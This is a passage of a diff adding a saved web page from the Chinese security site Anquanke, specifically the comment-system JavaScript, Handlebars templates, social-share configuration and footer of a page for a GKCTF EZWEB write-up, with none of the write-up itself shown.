+            swtichFavorite(post_favorite);
+            axios.post(api("user/favorite"), {"id": post_id}).then(function (res) {
+            });
+        }
+        else {
+            window.location.href = "/login";
+        }
+    }
+    function removeSpecialChar(s) {
+        if(!s)s="";
+        return s.replace("'","").replace("<","").replace(">","").replace("(","").replace(")","").replace("&","").replace(":","").replace("\'","").replace("\"","").replace("=","").replace(".","").replace(";","");
+    }
+
+    function loadComment(refresh) {
+        var request_url = "";
+        if (refresh) {
+            $("#comment-list").empty();
+        }
+        if (next) request_url = next;
+        else request_url = api("comment?top=true&size=30&page=1&post_id=" + post_id);
+        axios.get(request_url).then(function (res) {
+            var normal_comment_template_source = $("#normal-comment").html();
+            var normal_comment_template = Handlebars.compile(normal_comment_template_source);
+            if (res.data.data && res.data.data.length > 0) {
+                res.data.data.forEach(function (e) {
+                    var html = "";
+                    if(e.user)
+                    {
+                        e.user.nickname=removeSpecialChar(e.user.nickname);
+                    }
+
+                    if(e.nickname)
+                    {
+                        e.nickname=removeSpecialChar(e.nickname);
+                    }
+
+                    html = normal_comment_template(e);
+                    $("#comment-list").append(html);
+                });
+                next = res.data.next;
+                $("#comment-empty").hide();
+            }
+            else {
+                $("#comment-empty").show();
+                $("#loadButton").hide();
+            }
+
+            if ((!res.data.data) || res.data.data.length < 30) $("#loadButton").hide();
+            else $("#loadButton").show();
+        });
+    }
+
+    Handlebars.registerHelper('subcomments', function (value) {
+        var html = "";
+        $.each(value, function (i, item) {
+            var sub_comment_template_source = $("#normal-comment").html();
+            var sub_comment_template = Handlebars.compile(sub_comment_template_source);
+            html += sub_comment_template(item);
+        });
+        return new Handlebars.SafeString(html);
+    });
+    Handlebars.registerHelper('if_author', function (value, opts) {
+        if (value == user_id)
+            return opts.fn(this);
+        else
+            return opts.inverse(this);
+    });
+
+    function replyBox(comment_id, nickname) {
+        var reply_box_template_source = $("#reply-box").html();
+        var reply_box_template = Handlebars.compile(reply_box_template_source);
+        var currentLoginUser = getLocalUserInfo();
+        var html = reply_box_template({
+            comment_id: comment_id,
+            nickname: nickname,
+            currentLoginUser: currentLoginUser
+        });
+        $(".reply-box").empty();
+        $("#reply-box-" + comment_id).append(html);
+        getRandomNickname(comment_id);
+    }
+
+    function comment(comment_id) {
+        if (post_id) {
+            //用户未登录直接定向到登录界面
+            if (!getLocalUserInfo().isLogin) {
+                window.location.href = window.location.origin + '/login?redirectTo=' + window.location.href;
+                return;
+            }
+            var data = {};
+            if (comment_id)
+                data.content = $("#comment-content-" + comment_id).val();
+            else
+                data.content = $("#comment-content").val();
+            data.post_id = post_id;
+            if (comment_id)
+                data.parent = comment_id;
+            if (comment_id)
+                data.nickname = $("#comment-nickname-" + comment_id).val();
+            else
+                data.nickname = $("#comment-nickname").val();
+            if (getLocalUserInfo().isLogin)
+                data.nonce = getLocalUserInfo().user.nonce;
+            axios.post(api("comment"), data)
+                .then(function (response) {
+                    if (response.data.success) {
+                        $("#comment-empty").hide();
+                        $(".reply-box").empty();
+                        appendComment(comment_id, response.data.comment);
+                        if (!comment_id)
+                            $("#comment-content").val("");
+                    } else {
+                    }
+                })
+                .catch(function (error) {
+                });
+        }
+    }
+
+    function appendComment(comment_id, comment) {
+        var comment_template_source = $("#normal-comment").html();
+        var comment_template = Handlebars.compile(comment_template_source);
+        var html = comment_template(comment);
+        if (comment_id) {
+            $("#comment-child-" + comment_id).prepend(html);
+            $("#comment-child-" + comment_id).css("display", "block");
+        } else {
+            $("#comment-list").prepend(html);
+        }
+    }
+
+    function likePost() {
+        axios.post(api("post/like"), {"id": post_id}).then(function (res) {
+
+        });
+        $("#like_status").text("已赞");
+        $(".btn-like").attr("disabled", "disabled");
+        $("#like_count_area").text("(" + (parseInt($("#like_count").text().length == 0 ? 0 : ($("#like_count").text())) + 1) + ")");
+    }
+
+    function like(comment_id) {
+        if (!$("#comment-like-button-" + comment_id).hasClass("liked")) {
+            $("#comment-like-button-" + comment_id).addClass("liked");
+            var count = $("#comment-like-count-" + comment_id).text();
+            $("#comment-like-count-" + comment_id).text((count.length == 0 ? 0 : parseInt(count)) + 1);
+            axios.post(api("comment/like"), {
+                comment_id: comment_id,
+                post_id: post_id
+            })
+                .then(function (response) {
+                    if (response.data.success) {
+                    } else {
+                    }
+                })
+                .catch(function (error) {
+                });
+        }
+    }
+
+    function getRandomNickname(comment_id) {
+        let nicknames = ['Helen', 'Anonymous', '教主', '妇科圣手', '男科圣手', '大表姐', '大表哥', '带头大哥', '白帽子', '黑帽子', '越南邻国宰相',
+            '我不是黑客', '你全家都是黑客', '匿名用户', '管理员', '吃瓜群众', '小虎', '熊猫烧香作者', 'Ping溢出大神', 'Dir溢出大神', '神奇小子',
+            '土司观光团', '网瘾患者', '杨教授'
+        ];
+        var nickname = nicknames[random(0, nicknames.length - 1)];
+        if (comment_id)
+            $("#comment-nickname-" + comment_id).val(nickname);
+        else
+            $("#comment-nickname").val(nickname);
+        return nickname;
+    }
+
+    isFollow(148472);
+
+</script>
+
+    <script type="text/template" id="reply-box">
+        <div class="comment-box">
+            <textarea placeholder="回复 @{{nickname}} 的评论" id="comment-content-{{comment_id}}"></textarea>
+            <div class="bottom-area">
+                {{#if currentLoginUser.isLogin}}
+                <div style="float:left;" class="hide-in-mobile-device">
+                    <div style="float:left;height:28px;line-height:28px;margin-top: 2px;margin-left: 6px;">
+                        <a rel="noopener noreferrer" target="_blank"
+                           href="/member/{{currentLoginUser.user.id}}"
+                           style="color:#333333">
+                            <div>
+                                <div class="avatar"
+                                     style="height:28px;width:28px;float:left;background-image:url({{currentLoginUser.user.avatar}});"></div>
+                                <div style="float:left;margin-left:5px;">
+                                    <nobr><span class="nickname">{{currentLoginUser.user.nickname}}</span></nobr>
+                                </div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                {{else}}
+                <div style="float:left;" class="hide-in-mobile-device">
+                    <span style="color:#666666;margin-right:4px;font-size:12px;">昵称</span>
+                    <input type="text"
+                           style="border:none;height:30px;background-color:#e9e9e9;font-size:12px;padding-left:8px;color:#666666"
+                           id="comment-nickname-{{comment_id}}" style="" value="教主"></input>
+                    <span style="margin-left:12px;color:#999999;font-size:12px;cursor:pointer"
+                          onclick="getRandomNickname({{comment_id}});">
+                        <i class="fa fa-refresh" aria-hidden="true" style="margin-right:4px;"></i> 换一个</span>
+                </div>
+                {{/if}}
+                <div style="float:right;">
+                    <button class="btn btn-secondary btn-sm" onclick="$('#reply-box-{{comment_id}}').empty();">取消
+                    </button>
+                    <button class="btn btn-primary btn-sm" onclick="comment({{comment_id}});">发表评论</button>
+                </div>
+            </div>
+        </div>
+    </script>
+    <script type="text/template" id="normal-comment">
+        <li id="comment-item-{{id}}" class="comment-item {{#if parent}}subcomment{{/if}}">
+            {{#if user}}
+            <a href="/member/{{user.id}}" target="_blank">
+            <span class="img"
+                  style="background: rgba(0, 0, 0, 0) url({{crop_img user.avatar 120 120}}) no-repeat scroll 50% 50% / cover;"></span>
+            </a> {{else}}
+            <span class="img"
+                  style="background: rgba(0, 0, 0, 0) url({{crop_img avatar 120 120}}) no-repeat scroll 50% 50% / cover;"></span> {{/if}}
+            <div class="comment-item-body">
+                <div class="user-info">
+                    {{#if user}}
+                    <a href="/member/{{user.id}}" target="_blank">
+                        <span class="name {{#if_eq user.user_label 'official'}}official{{/if_eq}} {{#if_eq user.user_label 'verify'}}verify{{/if_eq}} {{#if_eq user.user_label 'src'}}src{{/if_eq}}">{{user.nickname}}</span>
+                        {{#if_eq user.user_label 'official'}}
+                        <img class="user-label-official" style="width:15px;height:15px;"/>
+                        {{/if_eq}} {{#if_eq user.user_label 'verify'}}
+                        <img class="user-label-verify" style="width:15px;height:15px;"/>
+                        {{/if_eq}} {{#if_eq user.user_label 'src'}}
+                        <img class="user-label-src" style="width:15px;height:15px;"/>
+                        {{/if_eq}} {{#if_eq user.user_label 'company'}}
+                        <img class="user-label-company" style="width:15px;height:15px;"/>
+                        {{/if_eq}}
+                        {{#if_eq user.user_label 'team'}}
+                        <img class="user-label-team" style="width:15px;height:15px;"/>
+                        {{/if_eq}}
+                    </a> {{else}}
+                    <span class="name" style="color:#999999">{{nickname}}</span> {{/if}} {{#if_author user.id}}
+                    <span class="time" style="color:#CC0033;font-weight:bold;vertical-align: middle">
+                        &nbsp;·&nbsp; 本文作者
+                    </span> {{/if_author}}
+                    <span class="time" style="vertical-align: middle">
+                        &nbsp;·&nbsp; {{date}}
+                    </span>
+                    <div class="user-info-right">
+                        <span class="commentlist-like">
+                            <span id="comment-like-button-{{id}}" onclick="like({{id}});"
+                                  class="commentlist-like-count {{#if liked}}liked{{/if}}">
+                                <i class="fa fa-thumbs-o-up" aria-hidden="true"></i>
+                                <span id="comment-like-count-{{id}}">{{#if_not_eq like_count 0}}{{like_count}} {{/if_not_eq}}</span>
+                        </span>
+                        </span>
+                        <a class="submit reply-comment"
+                           onclick="replyBox({{id}},'{{#if user}}{{user.nickname}}{{else}}{{nickname}}{{/if}}');">回复</a>
+                    </div>
+                </div>
+                <p>
+                    <span class="text">{{content}}</span>
+                <div class="reply-box" id="reply-box-{{id}}"></div>
+                </p>
+            </div>
+            {{#if_eq parent undefine}}
+            <ul id="comment-child-{{id}}" class="comment-child"
+                style="{{#if comments}}display:block;{{else}}display:none; {{/if}}">
+                {{subcomments comments}}
+            </ul>
+            {{/if_eq}}
+        </li>
+        {{#if comments}} {{#if parent}}
+        <ul id="comment-child-{{id}}" style="padding:0px;">
+            {{subcomments comments}}
+        </ul>
+        {{/if}} {{/if}}
+    </script>
+
+<script>
+    wx.config({
+        debug: false,
+        appId: 'wx9ba4ea8f6c451937',
+        timestamp: '1650955003',
+        nonceStr: 'SFxSt0Ut1IEvrsfN',
+        signature: '31d572fac57580f193ac1bd0c6b35a85bd2dc3a1',
+        jsApiList: ["onMenuShareTimeline", "onMenuShareAppMessage"]
+    });
+    wx.ready(function () {
+        wx.onMenuShareTimeline({
+            title: 'GKCTF EZWEB的分析题解和思考', // 分享标题
+            link: window.location.href,
+            imgUrl: 'https://p4.ssl.qhimg.com/sdm/100_100_100/t0118aa83bfa2870503.png',
+            success: function () {
+
+            },
+            cancel: function () {
+                // 用户取消分享后执行的回调函数
+            }
+        });
+        var desc = "https://p4.ssl.qhimg.com/t0118aa83bfa2870503.png";
+        wx.onMenuShareAppMessage({
+            title: 'GKCTF EZWEB的分析题解和思考',
+            desc: desc.replace(/[&\|\\\*^%$#@\-]/g, ""),
+            link: window.location.href,
+            imgUrl: 'https://p4.ssl.qhimg.com/sdm/100_100_100/t0118aa83bfa2870503.png',
+            type: 'link',
+            dataUrl: '',
+            success: function () {
+
+            },
+            cancel: function () {
+
+            }
+        });
+    });
+
+    hs.graphicsDir = 'https://static.anquanke.com/highslide/';
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    $('.article-content img').wrap(function () {
+        if (!$(this).parent().attr('href')) {
+            var imgurl = $(this).attr('data-original');
+            return '<a href="' + imgurl + '" class="highslide-img" onclick="return hs.expand(this);" target="_blank"></a>';
+        }
+    })
+
+</script>
+<footer>
+    <div class="footer">
+        <div class="container">
+            <div class="hide-in-mobile-device">
+                <div class="row">
+                    <div class="item col col-6">
+                        <div class="logo">
+                            <img alt="安全客Logo" class="pic" src="https://p0.ssl.qhimg.com/t0168809c9f19b4fec6.png"
+                                 style="height:54px;">
+                        </div>
+                        <div style="margin-top: 20px;">
+                            <div class="row">
+                                <div class="col col-5">
+                                    <a href="https://zhuanlan.zhihu.com/c_118578260" target="_blank"
+                                       rel="noopener noreferrer">
+                                        <div class="social zhihu">
+                                            <img src="https://p0.ssl.qhimg.com/t014afa383e7a786b4a.png" alt="安全客"
+                                                 style="width: 20px; height: 20px;">
+                                        </div>
+                                    </a>
+                                </div>
+
+                                <div class="col col-5">
+                                    <a href="https://weibo.com/360adlab" target="_blank"
+                                       rel="nofollow noopener noreferrer" style="color: white">
+                                        <div class="social weibo">
+                                            <svg fill="currentColor" preserveAspectRatio="xMidYMid meet" height="1em"
+                                                 width="1em" viewBox="0 0 40 40" style="vertical-align: middle;">
+                                                <g>
+                                                    <path d="m15.1 28.7q0.4-0.8 0.2-1.6t-1-1.1q-0.8-0.3-1.6 0t-1.4 1q-0.5 0.8-0.3 1.5t1 1.2 1.7 0 1.4-1z m2.1-2.7q0.1-0.3 0-0.6t-0.3-0.4q-0.4-0.2-0.7 0t-0.5 0.4q-0.3 0.7 0.3 1 0.3 0.1 0.7 0t0.5-0.4z m3.8 2.3q-1 2.3-3.5 3.4t-5 0.3q-2.4-0.8-3.3-2.9t0.2-4.1q1-2.1 3.4-3.1t4.7-0.5q2.4 0.7 3.5 2.7t0 4.2z m7-3.5q-0.2-2.2-2-3.8t-4.6-2.5-6.2-0.4q-4.9 0.5-8.2 3.1t-3 5.9q0.2 2.2 2 3.8t4.7 2.5 6.1 0.4q5-0.5 8.3-3.1t2.9-5.9z m6.9 0.1q0 1.5-0.8 3.1t-2.5 3-3.7 2.7-5.1 1.8-6 0.7-6.2-0.7-5.3-2.1-3.9-3.4-1.4-4.4q0-2.6 1.6-5.5t4.4-5.8q3.7-3.7 7.6-5.2t5.5 0.1q1.4 1.4 0.4 4.7-0.1 0.3 0 0.4t0.2 0.2 0.4 0 0.3-0.1l0.1-0.1q3.1-1.3 5.5-1.3t3.4 1.4q1 1.4 0 4 0 0.3-0.1 0.4t0.1 0.3 0.3 0.2 0.3 0.1q1.3 0.4 2.3 1t1.8 1.9 0.8 2.6z m-1.7-14q1 1.1 1.3 2.5t-0.2 2.6q-0.2 0.5-0.7 0.7t-0.9 0.1q-0.6-0.1-0.8-0.6t-0.1-1q0.5-1.4-0.5-2.5t-2.4-0.8q-0.6 0.1-1-0.2t-0.6-0.8q-0.1-0.5 0.2-1t0.8-0.5q1.4-0.3 2.7 0.1t2.2 1.4z m4.1-3.6q1.9 2.1 2.5 5t-0.3 5.4q-0.2 0.6-0.8 0.8t-1.1 0.1-0.9-0.7-0.1-1.2q0.6-1.8 0.2-3.8t-1.8-3.5q-1.4-1.6-3.3-2.2t-3.9-0.2q-0.6 0.2-1.1-0.2t-0.7-1 0.2-1.1 1-0.7q2.7-0.5 5.4 0.3t4.7 3z"></path>
+                                                </g>
+                                            </svg>
+                                        </div>
+                                    </a>
+                                </div>
+                                <!-- Modal -->
+
+                                <div class="col col-5">
+                                    <div class="social weixin" data-toggle="modal" data-target="#wechat-qrcode">
+                                        <svg fill="currentColor" preserveAspectRatio="xMidYMid meet" height="1em"
+                                             width="1em" viewBox="0 0 40 40" style="vertical-align: middle;">
+                                            <g>
+                                                <path d="m11.3 11.6q0-0.8-0.5-1.3t-1.3-0.5q-0.8 0-1.5 0.5t-0.6 1.3q0 0.7 0.6 1.2t1.5 0.5q0.8 0 1.3-0.5t0.5-1.2z m14.4 9.8q0-0.5-0.5-1t-1.3-0.4q-0.5 0-0.9 0.4t-0.5 1q0 0.5 0.5 1t0.9 0.4q0.8 0 1.3-0.4t0.5-1z m-4.6-9.8q0-0.8-0.5-1.3t-1.2-0.5q-0.9 0-1.5 0.5t-0.7 1.3q0 0.7 0.7 1.2t1.5 0.5q0.7 0 1.2-0.5t0.5-1.2z m12.3 9.8q0-0.5-0.5-1t-1.2-0.4q-0.6 0-1 0.4t-0.4 1q0 0.5 0.4 1t1 0.4q0.7 0 1.2-0.4t0.5-1z m-5.1-7.7q-0.6-0.1-1.4-0.1-3.3 0-6 1.5t-4.4 4.1-1.6 5.5q0 1.5 0.5 3-0.7 0-1.3 0-0.5 0-1 0t-1.1-0.1-0.8-0.1-1.1-0.2-1-0.3l-4.9 2.5 1.4-4.2q-5.6-4-5.6-9.5 0-3.3 1.9-6.1t5.1-4.3 7.1-1.6q3.4 0 6.4 1.3t5.1 3.5 2.7 5.1z m11.5 10.9q0 2.3-1.4 4.3t-3.6 3.8l1.1 3.5-3.9-2.1q-2.9 0.7-4.2 0.7-3.3 0-6-1.4t-4.4-3.7-1.6-5.1 1.6-5.1 4.4-3.8 6-1.3q3.1 0 5.9 1.3t4.4 3.8 1.6 5.1z"></path>
+                                            </g>
+                                        </svg>
+                                    </div>
+                                    <div class="modal fade " id="wechat-qrcode" tabindex="-1" role="dialog"
+                                         aria-hidden="true">
+                                        <div class="modal-dialog  modal-sm" role="document" style="width: 265px;">
+                                            <div class="modal-content"
+                                                 style="width: 265px !important;padding: 0px !important;">
+                                                <div class="modal-header">
+                                                    <h5 class="modal-title" id="exampleModalLabel">微信二维码</h5>
+                                                    <button type="button" class="close" data-dismiss="modal"
+                                                            aria-label="Close">
+                                                        <span aria-hidden="true">&times;</span>
+                                                    </button>
+                                                </div>
+                                                <div class="modal-body" style="padding: 0px !important;">
+                                                    <img src="https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg"
+                                                         alt="安全客" style="width: 265x; height: 265px;">
+                                                </div>
+
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="item col col-5">
+                        <h2>安全客</h2>
+                        <ul>
+                            <li>
+                                <a href="/about" rel="noopener noreferrer" target="_blank">关于我们</a>
+                            </li>
+                           
+                            <li>
+                                <a href="/note/contact" target="_blank" rel="noopener noreferrer">联系我们</a>
+                            </li>
+                            <li>
+                                <a href="/note/protocol" target="_blank" rel="noopener noreferrer">用户协议</a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="item col col-5">
+                        <h2>商务合作</h2>
+                        <ul>
+                            <li>
+                                <a href="/note/business" target="_blank" rel="noopener noreferrer">合作内容</a>
+                            </li>
+                            <li>
+                                <a href="/note/contact" target="_blank" rel="noopener noreferrer">联系方式</a>
+                            </li>
+                            <li>
+                                <a href="/link" target="_blank" rel="noopener noreferrer">友情链接</a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="item col col-5">
+                        <h2>内容须知</h2>
+                        <ul>
+                            <li>
+                                <a href="https://www.anquanke.com/contribute/tips" target="_blank"
+                                   rel="noopener noreferrer">投稿须知</a>
+                            </li>
+                            <li>
+                                <a href="/note/repost" target="_blank" rel="noopener noreferrer">转载须知</a>
+                            </li>
+                            <li>
+                                官网QQ群8：819797106
+                            </li>
+                            <li>
+                                官网QQ群3：830462644(已满)
+                            </li>
+                            <li>
+                                官网QQ群2：814450983(已满)
+                            </li>
+                            <li>
+                                官网QQ群1：702511263(已满)
+                            </li>
+
+
+                        </ul>
+                    </div>
+                    <div class="item col col-3">
+                        <h2>合作单位</h2>
+                        <ul>
+                            <li>
+                                <a href="http://www.cert.org.cn/" target="_blank" rel="noopener noreferrer">
+                                    <img alt="安全客" src="https://p0.ssl.qhimg.com/t01592a959354157bc0.png"
+                                         style="max-height: 40px;">
+                                </a>
+                            </li>
+                            <li>
+                                <a href="http://www.cnnvd.org.cn/" target="_blank" rel="noopener noreferrer">
+                                    <img alt="安全客" src="https://p0.ssl.qhimg.com/t014f76fcea94035e47.png"
+                                         style="max-height: 50px;margin-top:10px;">
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <div class="bottom-info">Copyright © 北京奇虎科技有限公司 360网络攻防实验室 安全客 All Rights Reserved <a href="https://beian.miit.gov.cn/">京ICP备08010314号-66</a>
+                <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+                    document.write(unescape("%3Cspan id='cnzz_stat_icon_1271278035'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s22.cnzz.com/z_stat.php%3Fid%3D1271278035%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
+                <script>
+                    (function () {
+                        var bp = document.createElement('script');
+                        var curProtocol = window.location.protocol.split(':')[0];
+                        if (curProtocol === 'https') {
+                            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                        }
+                        else {
+                            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                        }
+                        var s = document.getElementsByTagName("script")[0];
+                        s.parentNode.insertBefore(bp, s);
+                    })();
+                </script>
+            </div>
+        </div>
+    </div>
+
+    <div class="back-to-top" onclick='$("html,body").animate({scrollTop:0}, 500);'
+         style="position: fixed;bottom:40px;right: 20px;height: 40px;width: 40px;background-color: #1dada7;border-radius: 50%;text-align: center;cursor: pointer">
+        <img src="https://p0.ssl.qhimg.com/t0179ac3294ef926b8c.png" style="width:30px;margin-top: 6px;">
+    </div>
+    <div id="dynamicScript">
+    </div>
+
+</footer></body>
+
+</html>
